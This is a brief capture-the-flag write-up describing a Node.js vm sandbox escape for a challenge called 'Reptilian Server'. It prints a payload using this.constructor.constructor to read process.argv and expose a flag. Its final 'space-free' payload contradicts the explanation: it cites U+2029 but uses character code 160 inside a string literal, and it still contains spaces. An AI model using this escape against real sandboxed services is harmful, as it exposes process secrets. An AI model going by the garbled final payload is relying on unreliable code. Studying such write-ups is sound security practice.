# Solution to Reptilian Server

The solution to this challenge is complex, and the main difficulty is in establishing the VM escape. 

Its easy to see from the dockerfile that the flag will be provided as an argument to the process running the server.
In order to access that flag, you must escape the VM which runs your commands. This payload would normally do the trick: 

console.log((this.constructor.constructor('return (process.argv)'))())

However, to blend in with the reptillians we need to shorten this payload and remove the spaces from it. 

To shorten the payload, we can break it up into sections by storing parts of the payload in variables, like so:

let b='return (process.argv)'
let a=this.constructor.constructor(b);
console.log(a())

Then, in order to write this without any spaces, we can use a combination of String.fromCharCode and a unicode character "Paragraph Separator" (U+2029) 
to rewrite the payload without spaces, solving the challenge. 

let b='return+String.fromCharCode("160")+(process.argv)'
let a=this.constructor.constructor(b);
console.log(a())

